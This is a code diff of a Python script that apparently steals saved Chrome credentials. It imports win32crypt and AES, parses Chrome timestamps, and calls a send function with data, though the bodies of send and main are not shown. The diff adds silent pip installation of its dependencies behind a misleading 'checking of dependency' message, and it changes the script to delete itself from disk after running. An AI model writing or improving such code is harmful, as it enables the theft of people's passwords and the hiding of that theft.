@@ -1,14 +1,29 @@
+from datetime import timezone, datetime, timedelta
+import subprocess
+import sqlite3
+import shutil
+import base64
+import json
 import os
 import sys
-import json
-import base64
-import shutil
-import sqlite3
-import requests
-import win32crypt
-import subprocess
-from Crypto.Cipher import AES
-from datetime import timezone, datetime, timedelta
+
+print("checking of dependency.....")
+try:
+    import requests
+except:
+    print("installing requests")
+    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
+try:
+    from Crypto.Cipher import AES
+except:
+    print("installing pycryptodome")
+    subprocess.check_call(
+        [sys.executable, '-m', 'pip', 'install', 'pycryptodome'])
+try:
+    import win32crypt
+except:
+    print("installing pywin32")
+    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
 
 
 def chrome_date_and_time(chrome_data):
@@ -128,25 +143,12 @@ def main():
         pass
 
 
-def install():
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
-    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])
-    subprocess.check_call(
-        [sys.executable, '-m', 'pip', 'install', 'pycryptodome'])
-
-
 def delete_file():
-    os.remove('test.py')
+    os.remove(os.path.abspath(sys.argv[0]))
 
 
 if __name__ == "__main__":
     name = input("enter your name:  ")
     send(f"data from {name}")
-    print("installing")
-    install()
     main()
-    print("processing")
-    for i in range(10):
-        print('#', end='')
     print('success')
-    delete_file()
